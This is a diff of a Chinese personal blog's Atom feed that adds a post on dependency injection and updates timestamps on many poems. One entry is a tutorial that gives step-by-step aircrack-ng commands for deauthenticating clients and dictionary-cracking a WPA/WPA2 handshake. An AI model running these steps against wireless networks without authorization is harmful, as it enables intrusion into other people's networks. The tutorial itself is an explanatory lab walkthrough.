@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://www.chaosii.com/"/>
-  <updated>2018-10-03T15:34:36.663Z</updated>
+  <updated>2019-03-08T16:31:07.730Z</updated>
   <id>https://www.chaosii.com/</id>
   
   <author>
@@ -17,11 +17,37 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>依赖注入</title>
+    <link href="https://www.chaosii.com/2019/03/08/%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5/"/>
+    <id>https://www.chaosii.com/2019/03/08/依赖注入/</id>
+    <published>2019-03-08T15:09:18.000Z</published>
+    <updated>2019-03-08T16:31:07.730Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h4><p>某个对象在程序运行时需要使用一些外部资源，即该对象和这些外部资源存在依赖关系。</p><h4 id="依赖倒置原则-Dependence-Inversion-Principle"><a href="#依赖倒置原则-Dependence-Inversion-Principle" class="headerlink" title="依赖倒置原则  Dependence Inversion Principle"></a>依赖倒置原则  Dependence Inversion Principle</h4><p>程序要依赖于抽象接口，不要依赖于具体实现。</p><p>核心是面向抽象（抽象类或接口）编程</p><h4 id="控制反转-Inversion-of-Control-IoC"><a href="#控制反转-Inversion-of-Control-IoC" class="headerlink" title="控制反转  Inversion of Control  IoC"></a>控制反转  Inversion of Control  IoC</h4><p>IoC容器负责控制对象的生命周期和对象之间的关系</p><p>控制对象生存周期的不再是应用它的对象，而是IoC容器。</p><p>对于某个具体的对象而言，本应是它控制它所依赖的对象，现在却统一由IoC容器控制，这种情形就是控制反转。</p><h4 id="依赖注入-Dependency-Injection-DI"><a href="#依赖注入-Dependency-Injection-DI" class="headerlink" title="依赖注入  Dependency Injection  DI"></a>依赖注入  Dependency Injection  DI</h4><p>被注入对象 依赖 IoC容器 配置 其依赖对象</p><p>容器动态地将某个依赖关系注入到组件之中 便于组件重用</p><p>“谁依赖谁，为什么需要依赖，谁注入谁，注入了什么”</p><p>谁依赖谁：应用程序依赖于IoC容器</p><p>为什么需要依赖：应用程序需要IoC容器提供对象需要的外部资源</p><p>谁注入谁：IoC容器注入应用程序 某个对象（应用程序依赖的对象）</p><p>注入了什么：注入某个对象所需要的外部资源</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h4 id=&quot;依赖&quot;&gt;&lt;a href=&quot;#依赖&quot; class=&quot;headerlink&quot; title=&quot;依赖&quot;&gt;&lt;/a&gt;依赖&lt;/h4&gt;&lt;p&gt;某个对象在程序运行时需要使用一些外部资源，即该对象和这些外部资源存在依赖关系。&lt;/p&gt;
+&lt;h4 id=&quot;依赖倒置原则-Dependence-
+      
+    
+    </summary>
+    
+      <category term="编程思想" scheme="https://www.chaosii.com/categories/%E7%BC%96%E7%A8%8B%E6%80%9D%E6%83%B3/"/>
+    
+    
+      <category term="设计模式" scheme="https://www.chaosii.com/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
+    
+  </entry>
+  
+  <entry>
     <title>aircrack-ng无线路由密码破解</title>
     <link href="https://www.chaosii.com/2018/10/03/aircrack-ng%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
     <id>https://www.chaosii.com/2018/10/03/aircrack-ng无线路由密码破解/</id>
     <published>2018-10-02T23:05:00.000Z</published>
-    <updated>2018-10-03T15:34:36.663Z</updated>
+    <updated>2018-10-03T15:59:15.149Z</updated>
     
     <content type="html"><![CDATA[<h2 id="0x01-Aircrack-ng介绍"><a href="#0x01-Aircrack-ng介绍" class="headerlink" title="0x01 Aircrack-ng介绍"></a>0x01 Aircrack-ng介绍</h2><p><strong>Aircrack-ng</strong>是一个与<a href="https://zh.wikipedia.org/wiki/802.11" target="_blank" rel="noopener">802.11</a>标准的无线网络分析有关的安全软件，主要功能有：网络侦测，<a href="https://zh.wikipedia.org/wiki/%E5%97%85%E6%8E%A2" target="_blank" rel="noopener">数据包嗅探</a>，<a href="https://zh.wikipedia.org/wiki/%E6%9C%89%E7%B7%9A%E7%AD%89%E6%95%88%E5%8A%A0%E5%AF%86" target="_blank" rel="noopener">WEP</a>和<a href="https://zh.wikipedia.org/wiki/WPA" target="_blank" rel="noopener">WPA</a>/<a href="https://zh.wikipedia.org/w/index.php?title=WPA2-PSK&amp;action=edit&amp;redlink=1" target="_blank" rel="noopener">WPA2-PSK</a>破解。Aircrack-ng可以工作在任何支持<a href="https://zh.wikipedia.org/wiki/%E7%9B%91%E5%90%AC%E6%A8%A1%E5%BC%8F" target="_blank" rel="noopener">监听模式</a>的无线网卡上（设备列表请参阅其官方网站或<a href="https://web.archive.org/web/20081205015616/http://wiki.remote-exploit.org/index.php/HCL%3AWireless" target="_blank" rel="noopener">[1]</a>）并嗅探<a href="https://zh.wikipedia.org/wiki/802.11a" target="_blank" rel="noopener">802.11a</a>，<a href="https://zh.wikipedia.org/wiki/802.11b" target="_blank" rel="noopener">802.11b</a>，<a href="https://zh.wikipedia.org/wiki/802.11g" target="_blank" rel="noopener">802.11g</a>的数据。该程序可运行在<a href="https://zh.wikipedia.org/wiki/Linux" target="_blank" rel="noopener">Linux</a>和<a href="https://zh.wikipedia.org/wiki/Microsoft_Windows" target="_blank" rel="noopener">Windows</a>上。</p><p>aircrack-ng 包包含有：</p><table><thead><tr><th>Name</th><th>Description</th></tr></thead><tbody><tr><td>aircrack-ng</td><td>破解<a href="https://zh.wikipedia.org/wiki/%E6%9C%89%E7%B7%9A%E7%AD%89%E6%95%88%E5%8A%A0%E5%AF%86" target="_blank" rel="noopener">WEP</a>以及<a href="https://zh.wikipedia.org/w/index.php?title=Wi-Fi_Protected_Access&amp;action=edit&amp;redlink=1" target="_blank" rel="noopener">WPA</a>（<a href="https://zh.wikipedia.org/w/index.php?title=%E5%AD%97%E5%85%B8%E6%94%BB%E5%87%BB&amp;action=edit&amp;redlink=1" target="_blank" rel="noopener">字典攻击</a>）密钥</td></tr><tr><td>airdecap-ng</td><td>通过已知密钥来解密WEP或WPA嗅探数据</td></tr><tr><td>airmon-ng</td><td>将网卡设定为监听模式</td></tr><tr><td>aireplay-ng</td><td><a href="https://zh.wikipedia.org/w/index.php?title=%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B3%A8%E5%85%A5&amp;action=edit&amp;redlink=1" target="_blank" rel="noopener">数据包注入</a>工具（Linux和Windows使用<a href="https://zh.wikipedia.org/w/index.php?title=CommView&amp;action=edit&amp;redlink=1" target="_blank" rel="noopener">CommView</a>驱动程序）</td></tr><tr><td>airodump-ng</td><td><a href="https://zh.wikipedia.org/wiki/%E5%97%85%E6%8E%A2" target="_blank" rel="noopener">数据包嗅探</a>：将无线网络数据输送到PCAP或IVS文件并显示网络信息</td></tr><tr><td>airtun-ng</td><td>创建虚拟管道</td></tr><tr><td>airolib-ng</td><td>保存、管理ESSID密码列表</td></tr><tr><td>packetforge-ng</td><td>创建数据包注入用的加密包。</td></tr><tr><td>Tools</td><td>混合、转换工具</td></tr><tr><td>airbase-ng</td><td>软件模拟AP</td></tr><tr><td>airdecloak-ng</td><td>消除pcap文件中的WEP加密</td></tr><tr><td>airdriver-ng</td><td>无线设备驱动管理工具</td></tr><tr><td>airolib-ng</td><td>保存、管理ESSID密码列表，计算对应的密钥</td></tr><tr><td>airserv-ng</td><td>允许不同的进程访问无线网卡</td></tr><tr><td>buddy-ng</td><td>easside-ng的文件描述</td></tr><tr><td>easside-ng</td><td>和AP接入点通讯（无WEP）</td></tr><tr><td>tkiptun-ng</td><td>WPA/TKIP攻击</td></tr><tr><td>wesside-ng</td><td>自动破解WEP密钥</td></tr></tbody></table><h2 id="0x02-破解WPA-WPA2加密的无线路由实例"><a href="#0x02-破解WPA-WPA2加密的无线路由实例" class="headerlink" title="0x02 破解WPA/WPA2加密的无线路由实例"></a>0x02 破解WPA/WPA2加密的无线路由实例</h2><h3 id="【环境及设备】"><a href="#【环境及设备】" class="headerlink" title="【环境及设备】"></a>【环境及设备】</h3><p>windows10、Oracle VM VirtualBox、kali虚拟机、免驱无线网卡一枚【如亮科LK-110】,注意的点是VirtualBox要<a href="https://jingyan.baidu.com/article/22a299b5e0198a9e19376a38.html" target="_blank" rel="noopener">开启USB2.0支持</a>。</p><h3 id="【操作步骤】"><a href="#【操作步骤】" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h3><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><p>airmon-ng check kill #自动检查冲突程序并强制关闭 </p><h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><p>airmon-ng start wlan0 #开启monitor模式</p><p>该步骤可能会报错，按照termimal提示的指令解决即可</p><h4 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h4><p>airodump-ng wlan0mon #获取附近AP信息</p><h4 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h4><p>airodump-ng –bssid BSSID -c CH -w 文件位置 wlan0mon </p><p>airodump-ng -c 1 –bssid mac地址  -w ~/Desktop/cap/chaos wlan0mon</p><h4 id="第五步【新开terminal】"><a href="#第五步【新开terminal】" class="headerlink" title="第五步【新开terminal】"></a>第五步【新开terminal】</h4><p>aireplay-ng -0 1 -a mac地址 -c 客户端mac地址 wlan0mon</p><p>-0 为攻击次数 -c 可选</p><p>该指令可使连接AP的客户端断掉连接，一旦该客户端尝试重新连接，我们便可以抓取到握手数据包。</p><p>如果执行第五步后，第四步的terminal右上角显示handshake: AP的MAC(BSSID)，说明已经抓取到了握手数据包，可以使用字典进行下一步的破解。 </p><h4 id="第六步"><a href="#第六步" class="headerlink" title="第六步"></a>第六步</h4><p>aircrack-ng -w ~/Desktop/passwd/passwd.txt ~/Desktop/chaos/chaos-01.cap</p><p>其中passwd.txt为密码字典文件</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://zh.wikipedia.org/wiki/Aircrack-NG" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Aircrack-NG</a></p><p><a href="https://blog.csdn.net/qq_37367124/article/details/79587713" target="_blank" rel="noopener">kali linux 无线攻击——aircrack-ng</a></p><p><a href="https://blog.csdn.net/mingzznet/article/details/52782660" target="_blank" rel="noopener">使用 Aircrack-ng 破解 WEP 和 WPA/WPA2 加密的 Wi-Fi 密码。</a></p><p><a href="https://jingyan.baidu.com/article/22a299b5e0198a9e19376a38.html" target="_blank" rel="noopener">VirtualBox安装扩展增强包、解决USB2.0问题</a></p>]]></content>
     
@@ -75,7 +101,7 @@
     <link href="https://www.chaosii.com/2018/06/25/%E5%90%AC%E9%9B%A8%EF%BC%88%E4%B8%89%E9%A6%96%EF%BC%89/"/>
     <id>https://www.chaosii.com/2018/06/25/听雨（三首）/</id>
     <published>2018-06-24T23:05:00.000Z</published>
-    <updated>2018-10-03T15:34:36.670Z</updated>
+    <updated>2018-10-03T15:59:15.155Z</updated>
     
     <content type="html"><![CDATA[<p>（其一）<br>时有阵雨<br>隐约雷鸣<br>寻常巷陌<br>静听雨声</p><p>（其二）<br>岭南多雨季<br>隐约见雷鸣<br>寻常巷陌里<br>静卧听雨声</p><p>（其三）<br>寻常巷陌心常在<br>隐约雷鸣梦先知<br>素闻岭南多雨季<br>但听窗外雨声急</p>]]></content>
     
@@ -104,7 +130,7 @@
     <link href="https://www.chaosii.com/2018/05/21/%E5%A4%A9%E6%B6%AF/"/>
     <id>https://www.chaosii.com/2018/05/21/天涯/</id>
     <published>2018-05-21T15:21:00.000Z</published>
-    <updated>2018-10-03T15:34:36.672Z</updated>
+    <updated>2018-10-03T15:59:15.157Z</updated>
     
     <content type="html"><![CDATA[<p>窗外泛黄的枯草<br>隧道 桥梁 盘山路<br>充斥着白色标线<br>游戏变得无聊<br>喧嚣<br>索然无味<br>寂寥<br>淡漠<br>究竟什么是远方<br>好像这就是天涯<br>我在写些什么</p>]]></content>
     
@@ -132,7 +158,7 @@
     <link href="https://www.chaosii.com/2018/05/21/%E8%99%9A%E6%97%A0/"/>
     <id>https://www.chaosii.com/2018/05/21/虚无/</id>
     <published>2018-05-21T14:57:00.000Z</published>
-    <updated>2018-10-03T15:34:36.677Z</updated>
+    <updated>2018-10-03T15:59:15.162Z</updated>
     
     <content type="html"><![CDATA[<p>当手中的笔<br>再难以抒写世间的景<br>这繁花世界<br>有同于无<br>爱谁怨谁<br>遇见错过<br>只是时间的流逝<br>将这一切连根拔起<br>脑海中<br>满是荒芜<br>是逻辑更是虚无</p>]]></content>
     
@@ -160,7 +186,7 @@
     <link href="https://www.chaosii.com/2017/12/27/%E5%87%89%E5%B7%9E%E5%8D%B0%E8%B1%A1/"/>
     <id>https://www.chaosii.com/2017/12/27/凉州印象/</id>
     <published>2017-12-27T03:40:00.000Z</published>
-    <updated>2018-10-03T15:34:36.667Z</updated>
+    <updated>2018-10-03T15:59:15.152Z</updated>
     
     <content type="html"><![CDATA[<p>薄云旷野<br>乌山雪山<br>零落村舍<br>晓晕残霞</p>]]></content>
     
@@ -186,7 +212,7 @@
     <link href="https://www.chaosii.com/2017/11/18/%E5%AF%92%E8%A1%A3/"/>
     <id>https://www.chaosii.com/2017/11/18/寒衣/</id>
     <published>2017-11-18T13:23:00.000Z</published>
-    <updated>2018-10-03T15:34:36.674Z</updated>
+    <updated>2018-10-03T15:59:15.159Z</updated>
     
     <content type="html"><![CDATA[<p>五步一相隔<br>灰烬轻风舞<br>十月初授衣<br>故人今犹在</p>]]></content>
     
@@ -212,7 +238,7 @@
     <link href="https://www.chaosii.com/2017/05/07/%E4%B8%80%E8%B7%AF%E5%90%91%E5%8C%97/"/>
     <id>https://www.chaosii.com/2017/05/07/一路向北/</id>
     <published>2017-05-07T05:27:00.000Z</published>
-    <updated>2018-10-03T15:34:36.666Z</updated>
+    <updated>2018-10-03T15:59:15.151Z</updated>
     
     <content type="html"><![CDATA[<p>加速<br>制动<br>摇晃<br>嗡鸣<br>草木与建筑的掠影<br>在自己世界里的人<br>难得沉默<br>厌倦辗转<br>再相见</p>]]></content>
     
@@ -238,7 +264,7 @@
     <link href="https://www.chaosii.com/2016/07/10/%E6%97%A0%E9%A2%98%EF%BC%88%E8%A1%8C%E5%90%9F%E6%B2%AE%E6%B0%B4%E7%95%94%EF%BC%89/"/>
     <id>https://www.chaosii.com/2016/07/10/无题（行吟沮水畔）/</id>
     <published>2016-07-09T17:00:00.000Z</published>
-    <updated>2018-10-03T15:34:36.676Z</updated>
+    <updated>2018-10-03T15:59:15.160Z</updated>
     
     <content type="html"><![CDATA[<p>行吟沮水畔<br>轻云衔远山<br>我心自幽寂<br>何处起风烟</p>]]></content>
     
@@ -266,7 +292,7 @@
     <link href="https://www.chaosii.com/2016/03/12/%E5%8D%83%E4%B8%87%E6%8A%8A%E5%88%80/"/>
     <id>https://www.chaosii.com/2016/03/12/千万把刀/</id>
     <published>2016-03-12T15:25:00.000Z</published>
-    <updated>2018-10-03T15:34:36.670Z</updated>
+    <updated>2018-10-03T15:59:15.154Z</updated>
     
     <content type="html"><![CDATA[<p>自负<br>自卑<br>懒惰<br>胆怯<br>嫉妒<br>千万把刀<br>刀刀致命</p>]]></content>
     
@@ -292,7 +318,7 @@
     <link href="https://www.chaosii.com/2016/01/26/%E8%BF%9C%E6%96%B9%E7%9A%84%E4%BA%BA/"/>
     <id>https://www.chaosii.com/2016/01/26/远方的人/</id>
     <published>2016-01-26T13:53:00.000Z</published>
-    <updated>2018-10-03T15:34:36.678Z</updated>
+    <updated>2018-10-03T15:59:15.163Z</updated>
     
     <content type="html"><![CDATA[<p>远方的人，<br>语笑嫣然，<br>这么近，<br>那么远。</p><p>何苦失失落落，<br>往日或是今时，<br>毋有过多期许，<br>情绪波动，<br>如琴弦，<br>华年，<br>静静逝去，<br>心，<br>静静跳动。</p><p>回忆袭来，<br>些许感伤，<br>些许无奈，<br>些许怨怼，<br>些许欣喜，<br>亦静静逝去。</p>]]></content>
     
@@ -321,7 +347,7 @@
     <link href="https://www.chaosii.com/2016/01/01/%E9%95%BF%E9%A3%8E%E9%80%9D%E5%90%9B%E6%80%80/"/>
     <id>https://www.chaosii.com/2016/01/01/长风逝君怀/</id>
     <published>2016-01-01T04:28:00.000Z</published>
-    <updated>2018-10-03T15:34:36.680Z</updated>
+    <updated>2018-10-03T15:59:15.164Z</updated>
     
     <content type="html"><![CDATA[<p>风随雪兮雪伴风<br>时兮运兮人不归<br>清泪在鬓吾心悲<br>愿祖南海为仙翁<br>岁始初尝诀别苦<br>终日郁郁不得欢<br>求索求索可奈何<br>花落叶枯终有时<br>然则心瘴不得脱<br>但享人间嬉乐事<br>可笑书卷几受挫<br>无为之为师老庄<br>为学为己终为人<br>景随步移晦明间<br>云山雾绕访蜀地<br>李杜诗篇万口传<br>常辩常新味盎然<br>桃李不言下成蹊<br>愿吾所思入心间<br>绵绵八百里秦川<br>华山论剑迷金庸<br>甲子已丑海中金<br>丙寅丁卯炉中火<br>试以炉火试海金<br>百炼方得绕指柔<br>文化典籍如烟海<br>曰圣经者不一足<br>祖宗基业不可毁<br>去粗取精兼并蓄<br>辗转数地似过客<br>归去来兮若流风<br>长风吹渡几万里<br>愿终逝于君之怀</p>]]></content>
     
@@ -346,7 +372,7 @@
     <link href="https://www.chaosii.com/2015/11/01/%E9%99%8C%E7%94%9F%E5%8C%96/"/>
     <id>https://www.chaosii.com/2015/11/01/陌生化/</id>
     <published>2015-11-01T10:56:00.000Z</published>
-    <updated>2018-10-03T15:34:36.681Z</updated>
+    <updated>2018-10-03T15:59:15.165Z</updated>
     
     <content type="html"><![CDATA[<p>在我看来<br>人的成长是个陌生化的过程<br>新的认知体系会使你陌生化自己所熟识的事物<br>而每时每刻你的认知体系都会发生着或微妙或巨大的变化<br>未必现在优于过去<br>未必未来优于现在</p><p>正是陌生化让人生变得格外有趣<br>也正是陌生化让人生变得更有风险 </p>]]></content>
     
@@ -372,7 +398,7 @@
     <link href="https://www.chaosii.com/2015/09/18/%E9%9B%A8%E5%A4%9C/"/>
     <id>https://www.chaosii.com/2015/09/18/雨夜/</id>
     <published>2015-09-18T14:45:00.000Z</published>
-    <updated>2018-10-03T15:34:36.682Z</updated>
+    <updated>2018-10-03T15:59:15.166Z</updated>
     
     <content type="html"><![CDATA[<p>雨<br>滴滴点点流落<br>夜<br>分分秒秒渐深<br>有多少人<br>在自得其乐的世界里张扬<br>有多少情<br>在清幽的雨夜里溜出心房<br>遥见他日<br>那发生着故事的地方</p>]]></content>
     
@@ -400,7 +426,7 @@
     <link href="https://www.chaosii.com/2015/07/18/%E4%B8%80%E6%9C%B5%E8%8A%B1%E5%BC%80/"/>
     <id>https://www.chaosii.com/2015/07/18/一朵花开/</id>
     <published>2015-07-18T04:39:00.000Z</published>
-    <updated>2018-10-03T15:34:36.665Z</updated>
+    <updated>2018-10-03T15:59:15.150Z</updated>
     
     <content type="html"><![CDATA[<p>（一）<br>我用十年的时间等待<br>一朵花开<br>花儿绽放得如此完美<br>说是招蜂引蝶也不为过<br>然而我却没有想象中的那样喜悦<br>毕竟<br>等了太长的时间<br>连我自己也有点厌倦这等待了</p><p>（二）<br>有个人用十年的时间等待我的绽放<br>然而这多无聊啊<br>开花之后我就活不长了<br>然而他并不知道<br>我就这样一天天地看着他<br>他也这样一天天地看着我<br>我竟开始喜欢上这个奇怪的人<br>于是<br>我决心用自己的绽放换取他的笑颜<br>但他的笑容是那么僵硬<br>原来时间长了<br>什么都会变质的</p>]]></content>
     
@@ -426,7 +452,7 @@
     <link href="https://www.chaosii.com/2015/07/11/%E6%83%85%E8%B6%A3/"/>
     <id>https://www.chaosii.com/2015/07/11/情趣/</id>
     <published>2015-07-10T17:28:00.000Z</published>
-    <updated>2018-10-03T15:34:36.675Z</updated>
+    <updated>2018-10-03T15:59:15.159Z</updated>
     
     <content type="html"><![CDATA[<p>说着言不由衷的话<br>做着无可奈何的事<br>棱角慢慢磨光<br>星光渐渐黯淡<br>得失倒像浮云<br>情趣却如生命<br>天下熙熙<br>万民攘攘<br>只为淡如水？！<br>无趣无趣<br>也罢也罢<br>从明天起<br>做个有趣之人<br>万民与我何干？</p>]]></content>
     
@@ -452,7 +478,7 @@
     <link href="https://www.chaosii.com/2015/07/08/%E5%A4%A9%E7%A9%BA%E4%B8%8D%E4%BC%9A%E8%AF%B4%E8%AF%9D/"/>
     <id>https://www.chaosii.com/2015/07/08/天空不会说话/</id>
     <published>2015-07-08T09:11:00.000Z</published>
-    <updated>2018-10-03T15:34:36.673Z</updated>
+    <updated>2018-10-03T15:59:15.157Z</updated>
     
     <content type="html"><![CDATA[<p>天空不会说话<br>天空纯净得像个小孩子<br>但天空不会说话</p><p>天空不会说话<br>天空会黑下脸来生闷气<br>但天空不会说话</p><p>天空不会说话<br>天空会难过到潸然泪下<br>但天空不会说话</p><p>天空不会说话<br>天空见证了很多事<br>但天空不会说话</p><p>天空不会说话<br>幸亏天空不会说话<br>但天空真的不会说话吗</p>]]></content>
     
@@ -480,7 +506,7 @@
     <link href="https://www.chaosii.com/2015/02/07/%E9%A3%8E%E4%BA%91%E4%B8%8E%E6%83%85/"/>
     <id>https://www.chaosii.com/2015/02/07/风云与情/</id>
     <published>2015-02-07T13:57:00.000Z</published>
-    <updated>2018-10-03T15:34:36.683Z</updated>
+    <updated>2018-10-03T15:59:15.167Z</updated>
     
     <content type="html"><![CDATA[<p>青青河畔之草<br>露珠渐渐消失<br>叽叽喳喳雏鸟<br>伸展两翼 </p><p>青山碧水日光照耀<br>花谢花开满心欢喜<br>巴东巫峡有猿长啸<br>亦无多事</p><p>春去秋来 懒得去知晓<br>天地之间 楼阁林立<br>寻寻觅觅 依然找不到<br>千山万水 你在哪里</p><p>浮浮沉沉宿命 恩恩怨怨难逃<br>有太多不如意 几欲狠心抽离<br>生死明灭易难 怎会清晰可辨<br>斩断青丝惟愿 昂首天地立</p><p>残云几许如火 点染我长袖袍<br>遥梦超脱世外 却未斩断情丝<br>绵绵长夜未央 思念何曾断绝<br>痴狂永不褪散 且行且珍惜</p><p>泠泠水中之影<br>涟漪渐渐消散<br>仙人气质锦鲤<br>喜跃龙门</p><p>白山黑水月光下澈<br>风起风止心中淡然<br>烛残未觉与日争辉<br>那又何妨</p><p>冬去春来 又是新一年<br>广运千里 莫不欢腾<br>寻寻觅觅 终于找到你<br>千山万水 你在眼里</p><p>浮浮沉沉宿命 恩恩怨怨难逃<br>有太多不如意 几欲狠心抽离<br>生死明灭易难 怎会清晰可辨<br>斩断青丝惟愿 昂首天地立</p><p>残云几许如火 点染我长袖袍<br>遥梦超脱世外 却未斩断情丝<br>绵绵长夜未央 思念何曾断绝<br>痴狂也会褪散 且行且珍惜</p>]]></content>
     
@@ -507,7 +533,7 @@
     <link href="https://www.chaosii.com/2014/11/22/%E5%88%9D%E6%8E%A2/"/>
     <id>https://www.chaosii.com/2014/11/22/初探/</id>
     <published>2014-11-22T03:02:00.000Z</published>
-    <updated>2018-10-03T15:34:36.668Z</updated>
+    <updated>2018-10-03T15:59:15.153Z</updated>
     
     <content type="html"><![CDATA[<blockquote><p>“这个胆大妄为的开端是绘画艺术极重要的一个部分。我们不要野心太大，我们并不希冀传世之作，能够在一盒颜料中其乐陶陶，我们就心满意足了。而要这样，大胆则是唯一的门券。”</p></blockquote><p>小心翼翼、亦步亦趋地学习绘画，很容易囿于形式，很难有突破性的进步。相反，抛开杂念，信手漫涂，最容易顿悟个中妙趣。诚然，形式也是很重要的，但相比“拘谨-放开”，“放开-拘谨-放开”模式一定是更有效率的。 </p><p>摄影、作文要先学习技法，再忘掉技法。读书时要由厚读薄，再由薄读厚。但是，仅仅如此是不够的，要敢于初探，没教你这个旋钮的效用，手里拿的单反相机你都不敢去拧，不会通过自己的方法获得经验抑或答案，终归是不好的，大概就是这个道理。不拘泥于前人引导的形式，有自己的想法，才是学习要达到的最终境界。 </p><p>要锻炼自己的胆量，敢于突破，敢于创新，即使有那么几次会摔得头破血流，却也总是值得的。只是唯唯诺诺，畏首畏尾，怎会得到他人的敬意？总担心失去，又怎会获得？不敢去尝试，又怎会成功？ </p><p>​谨以此文给予我力量，给予读者力量。 </p>]]></content>
     
